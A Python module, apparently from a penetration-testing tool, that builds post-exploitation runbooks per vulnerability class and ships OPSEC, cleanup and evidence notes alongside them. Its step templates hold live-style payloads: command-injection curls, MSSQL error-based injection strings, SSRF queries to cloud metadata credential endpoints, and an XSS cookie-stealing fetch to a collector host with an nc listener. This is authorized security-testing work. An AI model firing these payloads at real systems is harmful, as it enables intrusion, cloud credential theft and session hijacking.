"""
Post-exploitation runbook generator for VANTHEX — AUTHORIZED TESTING ONLY.

Takes one finding dict (vulnscan2.F() shape) and a target string and
returns an operator runbook:

    { "finding_ref", "target", "authorized_only",
      "playbook_steps",        # ordered steps: {"n", "title", "description", "command"}
      "opsec_notes",           # safety / authorization notes
      "cleanup_steps",         # steps to undo any footprint left behind
      "evidence_to_capture" }  # what to screenshot / log

The runbook is DOCUMENTATION — generate_runbook() never executes anything;
every step is described and ships with a copy-paste style example command
the OPERATOR may choose to run manually on an authorized engagement.

Classification is pattern-based over title/description (mirrors
attackgraph.classify_finding style): rce/cmdi, sqli, ssrf->cloud,
xss, idor, and a generic default.
"""
import re

AUTHORIZED_HEADER = (
    "AUTHORIZED TESTING ONLY — run only within a signed engagement "
    "window against the in-scope target. Steps are documentation, "
    "never auto-executed."
)


def classify(finding):
    """Map a finding to a playbook class (or 'generic')."""
    text = f"{finding.get('title', '')} {finding.get('description', '')}"
    if re.search(r"rce|remote code execution|command injection|cmd\s?i|"
                 r"shell injection|ssti|template injection", text, re.I):
        return "rce"
    if re.search(r"sql\s?injection|\bsqli\b|error[- ]based sql|blind sql", text, re.I):
        return "sqli"
    if re.search(r"\bssrf\b|server[- ]side request|cloud metadata|"
                 r"metadata endpoint|metadata service", text, re.I):
        return "ssrf_cloud"
    if re.search(r"\bxss\b|cross[- ]site scripting|script injection", text, re.I):
        return "xss"
    if re.search(r"\bidor\b|insecure direct object|object reference|"
                 r"access control.*(object|id)|broken.*access control", text, re.I):
        return "idor"
    return "generic"


def _s(title, description, command):
    return {"title": title, "description": description, "command": command}


def _rce_steps(target):
    """RCE/CMDi: safe file-read proof, user listing, priv-enum, persistence check."""
    return [
        _s("Prove execution with a safe read-only marker",
           "Run a single harmless command that proves command execution without "
           "modifying anything: print a unique marker and the process identity.",
           f"curl -s '{target}/api/exec' --data 'cmd=echo VANTHEX-RCE-$((6*7)); id'"),
        _s("Read a benign file as proof",
           "Read a non-sensitive, world-readable file (/etc/hostname) to "
           "demonstrate file read without touching user data.",
           f"curl -s '{target}/api/exec' --data 'cmd=cat /etc/hostname'"),
        _s("List local users (described only)",
           "Enumerate account names from /etc/passwd — names only, no shadow "
           "or credential files. Confirm scope allows user enumeration.",
           f"curl -s '{target}/api/exec' --data 'cmd=cut -d: -f1 /etc/passwd'"),
        _s("Privilege enumeration (described only)",
           "Identify the current privilege level, sudo rights of the "
           "compromised user, and suid binaries — read-only checks.",
           f"curl -s '{target}/api/exec' --data 'cmd=id; sudo -n -l 2>/dev/null; find / -perm -4000 -type f 2>/dev/null | head -20'"),
        _s("Persistence check (detective only)",
           "Check for EXISTING persistence mechanisms (cron jobs, ssh keys, "
           "startup units) as evidence of prior compromise. Do NOT install "
           "any persistence yourself.",
           f"curl -s '{target}/api/exec' --data 'cmd=ls -la /etc/cron* /var/spool/cron 2>/dev/null; ls ~/.ssh 2>/dev/null'"),
    ]


def _sqli_steps(target):
    return [
        _s("Confirm error-based SQLi with a benign query",
           "Trigger a visible database error that reveals the DBMS version "
           "and confirms error-based injection. No data extracted yet.",
           f"curl -s \"{target}/item?id=1' AND 1=CONVERT(int,@@version)-- -\""),
        _s("Database enumeration (described only)",
           "Enumerate database names, then tables, then column counts for "
           "in-scope schemas via error-based UNION/CONVERT queries.",
           f"curl -s \"{target}/item?id=1' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sys.databases WHERE name NOT IN ('master','tempdb','model','msdb')))-- -\""),
        _s("Define dump scope before extracting",
           "Agree in writing which tables/columns may be read (e.g. a demo "
           "table or a count). Record the scope in the engagement log before "
           "any row extraction.",
           "# scope note: SELECT COUNT(*) on approved table only\ncurl -s \"{target}/item?id=1' AND 1=CONVERT(int,(SELECT COUNT(*) FROM approved_scope.users))-- -\""),
        _s("Blast-radius assessment",
           "Estimate blast radius: count rows in sensitive tables (PII, "
           "credentials, sessions) WITHOUT reading their contents, to size "
           "impact for the report.",
           f"curl -s \"{target}/item?id=1' AND 1=CONVERT(int,(SELECT COUNT(*) FROM users))-- -\""),
    ]


def _ssrf_steps(target):
    """SSRF->cloud: metadata endpoints per provider, IAM role abuse description."""
    return [
        _s("Probe AWS instance metadata (IMDSv1)",
           "If the target runs on AWS, have the SSRF endpoint request the "
           "instance metadata address. IMDSv2 (token-required) blocks this; "
           "success means IMDSv1 is enabled.",
           f"curl -s '{target}/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'"),
        _s("Probe GCP metadata",
           "GCP requires a Metadata-Flavor header; include it via the SSRF "
           "endpoint to list the attached service-account scopes.",
           f"curl -s -H 'Metadata-Flavor: Google' '{target}/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/'"),
        _s("Probe Azure metadata",
           "Azure IMDS requires the header below; query it to confirm the "
           "resource identity exists before any token request.",
           f"curl -s -H 'Metadata: true' '{target}/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01'"),
        _s("IAM role abuse assessment (described only)",
           "If role credentials are exposed, LIST the role name only. Describe "
           "the abuse path (e.g. sts:GetCallerIdentity, s3:ListBucket) in the "
           "report instead of executing it, unless the engagement scope "
           "explicitly authorizes cloud API calls.",
           f"curl -s '{target}/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'  # record role name only"),
        _s("Guardrail: never pivot with stolen cloud credentials",
           "Do not use recovered cloud tokens against AWS/GCP/Azure APIs "
           "without written authorization; a single S3 list can be "
           "out-of-scope access on production data.",
           "# documented, NOT executed: sts get-caller-identity requires explicit scope"),
    ]


def _xss_steps(target):
    return [
        _s("Build a marker payload",
           "Use a non-exfiltrating marker payload (unique id + harmless "
           "console beacon) to confirm script execution in the victim browser.",
           f"<script>fetch('/xss-probe?marker=VANTHEX-XSS-001')</script>"),
        _s("Session-hijack test plan (described only)",
           "If authorized: have the admin bot visit the page; capture the "
           "session cookie via the in-scope listener, then replay it ONLY "
           "against the test account to confirm the session is accepted. "
           "Never reuse it on real users.",
           f"# listener: nc -lvnp 8000  (in-scope collector)\n# payload: <script>fetch('http://collector:8000/c?'+document.cookie)</script>"),
        _s("Admin-bot trigger",
           "Submit the payload to the vulnerable field and trigger the admin "
           "review bot (if provided by the platform) or an authorized test "
           "account visit.",
           f"curl -s '{target}/submit' --data 'body=<script>fetch(\"/xss-probe?marker=VANTHEX-XSS-001\")</script>'"),
        _s("Document impact",
           "Record what an attacker could do: session theft, silent admin "
           "actions via XMLHttpRequest, credential phishing. Screenshots of "
           "the executed payload suffice — no real exfiltration.",
           "# evidence: screenshot of console/network tab showing the probe"),
    ]


def _idor_steps(target):
    return [
        _s("Confirm the reference is readable cross-user",
           "Request one object belonging to an authorized second TEST account "
           "using the vulnerable id — never other customers' real data.",
           f"curl -s '{target}/api/orders/1002' -H 'Authorization: Bearer $TEST_USER_TOKEN'"),
        _s("Object enumeration scope (described only)",
           "Define the enumeration scope: sequential ids to probe (e.g. "
           "1000-1010), rate limit, and stop condition. Record it before "
           "probing.",
           f"# probe ids 1000-1010, 1 req/2s, stop on first cross-user hit\ncurl -s '{target}/api/orders/1003' -H 'Authorization: Bearer $TEST_USER_TOKEN'"),
        _s("Classify exposed fields",
           "For each exposed object, classify fields: public / internal / PII "
           "/ credential. Counts per class go in the report; PII values are "
           "masked in evidence.",
           "# evidence: response JSON with PII fields masked, classification table in notes"),
    ]


def _generic_steps(target):
    return [
        _s("Confirm the finding reproducibly",
           "Re-run the minimum reproducing request and save the raw "
           "request/response pair.",
           f"curl -s -i '{target}'"),
        _s("Assess authentication level",
           "Check whether the issue requires authentication and which role "
           "— unauthenticated findings escalate faster.",
           f"curl -s -o /dev/null -w '%{{http_code}}\\n' '{target}'"),
        _s("Map reachable data",
           "Identify which endpoints/data the vulnerability can reach "
           "(read-only requests only).",
           f"curl -s '{target}' | grep -oiE 'href=\"[^\"]+\"' | head -20"),
        _s("Privilege-escalation checklist (described only)",
           "Consider: broken access control on sibling endpoints, token/role "
           "confusion, injection chains (see attackgraph chains), and "
           "persistence checks — describe each as a hypothesis before testing.",
           "# escalate only with documented authorization for each hypothesis"),
    ]


_PLAYBOOKS = {
    "rce": _rce_steps,
    "sqli": _sqli_steps,
    "ssrf_cloud": _ssrf_steps,
    "xss": _xss_steps,
    "idor": _idor_steps,
    "generic": _generic_steps,
}

_OPS = {
    "rce": [
        "RCE steps are AUTHORIZED-ONLY: file-read proofs and enumeration must be named in the engagement scope.",
        "No persistence installation, no writes, no payload staging — detective checks only.",
        "Avoid loading /etc/shadow, credential stores, or production databases.",
    ],
    "sqli": [
        "Dump only tables named in the approved dump scope; counts over contents where possible.",
        "Error-based enumeration generates loud DB errors — notify the owner and expect WAF/blocks.",
        "Mask PII in evidence before storing screenshots.",
    ],
    "ssrf_cloud": [
        "Cloud metadata access is high-impact: record identifiers only, never use recovered tokens.",
        "No cloud API pivoting (S3/STS/Compute) without explicit written authorization.",
        "Prefer IMDSv2-enforcing findings be reported as remediations, not exploited.",
    ],
    "xss": [
        "Never send real users the payload; use the platform's admin bot or authorized test accounts.",
        "No cookie exfiltration from real sessions — proof of execution is sufficient.",
    ],
    "idor": [
        "Probe only synthetic/second test-account objects; never real customer records.",
        "Rate-limit enumeration and mask PII fields in all evidence.",
    ],
    "generic": [
        "Every escalation hypothesis needs explicit scope coverage before testing.",
        "Read-only verification first; stop at the first sign of instability.",
    ],
}

_CLEAN = {
    "rce": [
        "Close any reverse-shell/listener sessions you opened (kill the local listener).",
        "Delete any marker artifacts created on the target (none should exist with read-only steps).",
        "Note the engagement end time and confirm no sessions remain in your evidence log.",
    ],
    "sqli": [
        "Ensure no injected rows/records were written (error-based steps are read-only).",
        "Purge raw DB responses containing PII from local evidence after the report is delivered.",
    ],
    "ssrf_cloud": [
        "Delete any captured metadata responses/role credentials from local files immediately after recording identifiers.",
        "Confirm no cloud-side sessions or API keys were created.",
    ],
    "xss": [
        "Remove any submitted marker payloads from the test application (via the test account) if the platform allows.",
        "Shut down the local collector listener.",
    ],
    "idor": [
        "Confirm enumeration stopped at the agreed scope; delete raw cross-user responses containing PII.",
    ],
    "generic": [
        "Remove any test artifacts created during verification.",
        "Record cleanup completion in the engagement log.",
    ],
}

_EVIDENCE = {
    "rce": [
        "Screenshot: marker command output showing the unique marker and `id`.",
        "Log: raw HTTP request/response of the file-read proof.",
        "Screenshot: privilege enumeration output (id, sudo -l).",
        "Log: persistence-check output (cron/ssh key listing).",
    ],
    "sqli": [
        "Screenshot: error message revealing the DBMS version.",
        "Log: enumeration queries and responses (database/table names).",
        "Log: dump-scope approval note and row counts.",
    ],
    "ssrf_cloud": [
        "Screenshot: metadata response per provider (role/account names only, secrets redacted).",
        "Log: which metadata endpoints responded and which were IMDSv2-protected.",
    ],
    "xss": [
        "Screenshot: payload executing in the browser console/network tab.",
        "Log: admin-bot visit timestamp and collector beacon receipt.",
        "Log: session-replay confirmation against the TEST account only.",
    ],
    "idor": [
        "Screenshot: cross-user object response (PII masked).",
        "Log: enumeration scope, ids probed, field classification table.",
    ],
    "generic": [
        "Log: minimum repro request/response pair.",
        "Screenshot: affected endpoint behavior before/after.",
    ],
}


def generate_runbook(finding, target):
    """Build the post-exploitation runbook dict for one finding (never raises).

    finding: dict with at least title/description (vulnscan2.F() shape);
    target : base URL/host string.
    """
    try:
        f = dict(finding or {})
        tclass = classify(f)
        steps = _PLAYBOOKS[tclass](str(target or "<target>"))
        playbook_steps = [
            dict(step, n=i + 1, authorized_only=True)
            for i, step in enumerate(steps)
        ]
        ref = str(f.get("id") or f.get("ref") or f.get("title") or "finding")
        return {
            "finding_ref": ref,
            "target": str(target or ""),
            "class": tclass,
            "authorized_only": True,
            "header": AUTHORIZED_HEADER,
            "title": str(f.get("title", ref)),
            "playbook_steps": playbook_steps,
            "opsec_notes": list(_OPS[tclass]),
            "cleanup_steps": list(_CLEAN[tclass]),
            "evidence_to_capture": list(_EVIDENCE[tclass]),
        }
    except Exception:
        return {
            "finding_ref": "unknown", "target": str(target or ""),
            "class": "generic", "authorized_only": True,
            "header": AUTHORIZED_HEADER, "title": "unknown",
            "playbook_steps": [], "opsec_notes": [],
            "cleanup_steps": [], "evidence_to_capture": [],
        }


def render_runbook_markdown(runbook):
    """Render a runbook dict as markdown text (never raises)."""
    try:
        r = dict(runbook or {})
        lines = [f"# Post-exploitation runbook: {r.get('title', 'finding')}",
                 "", f"> **{AUTHORIZED_HEADER}**", ""]
        lines.append(f"- Finding: `{r.get('finding_ref', 'unknown')}`")
        lines.append(f"- Target: `{r.get('target', '')}`")
        lines.append(f"- Class: `{r.get('class', 'generic')}`")
        lines.append("")
        lines.append("## Playbook steps")
        for s in r.get("playbook_steps") or []:
            lines.append(f"### Step {s.get('n')} — {s.get('title')}")
            lines.append(s.get("description", ""))
            lines.append("")
            lines.append("```")
            lines.append(str(s.get("command", "")))
            lines.append("```")
            lines.append("")
        for key, heading in (("opsec_notes", "OPSEC notes"),
                             ("cleanup_steps", "Cleanup steps"),
                             ("evidence_to_capture", "Evidence to capture")):
            lines.append(f"## {heading}")
            for item in r.get(key) or []:
                lines.append(f"- {item}")
            lines.append("")
        return "\n".join(lines).rstrip() + "\n"
    except Exception:
        return ""


# back-compat alias requested by spec wording
render_runbook_markbook = render_runbook_markdown
